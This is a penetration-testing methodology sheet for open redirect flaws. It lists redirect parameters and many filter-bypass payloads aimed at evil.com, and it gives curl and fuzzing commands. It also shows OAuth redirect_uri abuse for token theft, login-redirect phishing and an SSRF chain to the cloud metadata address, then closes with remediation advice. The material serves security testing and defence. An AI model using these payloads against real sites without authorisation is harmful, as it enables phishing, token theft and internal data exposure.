# Open Redirect Testing

## Overview
Open redirect vulnerabilities occur when an application accepts user-controlled input to determine a redirect destination without proper validation. Attackers exploit this to redirect victims from a trusted domain to malicious sites, enabling phishing attacks, OAuth token theft, SSRF chains, and bypassing URL-based security controls.

## Classification
- **CWE:** CWE-601 (URL Redirection to Untrusted Site)
- **OWASP:** A01:2021 - Broken Access Control
- **CVSS Base:** 4.7 - 6.1 (higher when chained with OAuth or SSO)

## Detection Methodology

### 1. Identify Redirect Parameters
Common parameter names used for redirects:
```
url, redirect, redirect_url, redirect_uri, return, returnTo, return_url,
next, nextUrl, target, to, dest, destination, redir, redirect_to,
continue, forward, goto, go, out, view, ref, callback, path, login_url,
image_url, domain, checkout_url, return_path, success_url, failure_url,
RelayState, SAMLRequest, openid.return_to
```

Look for redirect patterns:
```
https://target.com/login?redirect=https://target.com/dashboard
https://target.com/auth/callback?next=/profile
https://target.com/out?url=https://partner.com
https://target.com/go?to=/docs
```

### 2. Basic Open Redirect Payloads
```bash
# External domain redirect
curl -s -D- -o /dev/null "https://target.com/redirect?url=https://evil.com"

# Check for 3xx redirect or meta refresh to evil.com
# Location: https://evil.com
```

### 3. Filter Bypass Techniques

**Protocol-relative URLs:**
```
//evil.com
///evil.com
////evil.com
```

**Domain confusion:**
```
https://evil.com@target.com
https://target.com@evil.com
https://evil.com#target.com
https://evil.com?target.com
https://target.com.evil.com
https://evil.com/target.com
https://evil.com%23@target.com
```

**URL encoding bypasses:**
```
https://evil.com%00.target.com
https://evil.com%0d%0a.target.com
https:%2F%2Fevil.com
%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D   (full URL encode)
https://evil.com/%2e%2e
```

**Backslash and special characters:**
```
https://evil.com\@target.com
\/\/evil.com
/\evil.com
https:///evil.com
https:evil.com
javascript:alert(1)   (if used in href)
data:text/html,<script>alert(1)</script>
```

**Subdomain and path confusion:**
```
https://target.com.evil.com
https://targetcom.evil.com
https://evil.target.com        (if subdomains aren't validated)
https://target.com/redirect?url=//evil.com/%2F..
```

**Double encoding:**
```
https://target.com/redirect?url=%252F%252Fevil.com
```

**Unicode/IDNA confusion:**
```
https://targ%E2%80%8Bet.com      (zero-width space)
https://target.com%E3%80%82evil.com  (fullwidth period)
```

### 4. Parameter Pollution
```bash
# Duplicate parameters (first vs last wins)
/redirect?url=https://target.com&url=https://evil.com

# Array notation
/redirect?url[]=https://evil.com

# Fragment injection
/redirect?url=https://target.com#https://evil.com
```

### 5. Redirect Chains
Chain internal redirects to reach external destinations:
```
/redirect?url=/second-redirect?url=https://evil.com
/redirect?url=https://target.com/open-redirect?url=https://evil.com
```

### 6. Context-Specific Redirect Exploitation

**OAuth token theft:**
```
# Manipulate redirect_uri in OAuth flow
https://auth.target.com/authorize?
  client_id=APP_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  scope=openid

# If redirect_uri validation is weak, auth code/token is sent to attacker
```

**Login redirect phishing:**
```
https://target.com/login?next=https://evil.com/fake-login
# User logs in legitimately, then gets redirected to attacker's phishing page
# Victim trusts the flow because login was on the real domain
```

**SSRF chain via open redirect:**
```
# If SSRF filter validates domain but follows redirects:
POST /fetch?url=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### 7. Header-Based Redirects
```bash
# Host header redirect
curl -s -D- -H "Host: evil.com" https://target.com/

# X-Forwarded-Host redirect
curl -s -D- -H "X-Forwarded-Host: evil.com" https://target.com/

# Check if response Location header uses the injected host
```

## Tool Usage
```bash
# Nuclei open redirect templates
nuclei -u https://target.com -t http/vulnerabilities/open-redirect/ -batch

# ParamSpider (find URL parameters)
paramspider -d target.com

# OpenRedireX - automated open redirect finder
python3 openredirex.py -l urls.txt -p payloads.txt

# Manual fuzzing with curl
while read payload; do
  resp=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
    "https://target.com/redirect?url=$payload")
  echo "$payload → $resp"
done < payloads.txt

# Burp Suite
# 1. Spider/crawl to find redirect parameters
# 2. Send to Intruder with redirect payload list
# 3. Filter for 3xx responses with external Location headers

# Wayback Machine parameter mining
waybackurls target.com | grep -iE "(redirect|url|next|goto|return)=" | sort -u
```

## Remediation
1. **Avoid user-controlled redirects** -- use server-side redirect mapping (ID-to-URL lookup)
2. **Allowlist destinations** -- validate redirect URLs against a strict whitelist of permitted domains
3. **Validate URL parsing** -- use a proper URL parser, check scheme and host after parsing
4. **Reject external URLs** -- only allow relative paths or same-domain redirects
5. **Block dangerous schemes** -- reject `javascript:`, `data:`, `vbscript:` schemes
6. **Warn users** -- display an interstitial page ("You are leaving target.com")
7. **Cryptographic tokens** -- sign redirect URLs to prevent tampering

## Evidence Collection
- Redirect parameter name and endpoint URL
- Payload that triggers the open redirect
- Full HTTP response showing 3xx status and Location header pointing to external domain
- Filter bypass technique used (if applicable)
- Redirect chain if multiple redirects are involved
- Context of exploitation (OAuth flow, login redirect, SSRF chain)
- Impact assessment (phishing, token theft, security control bypass)
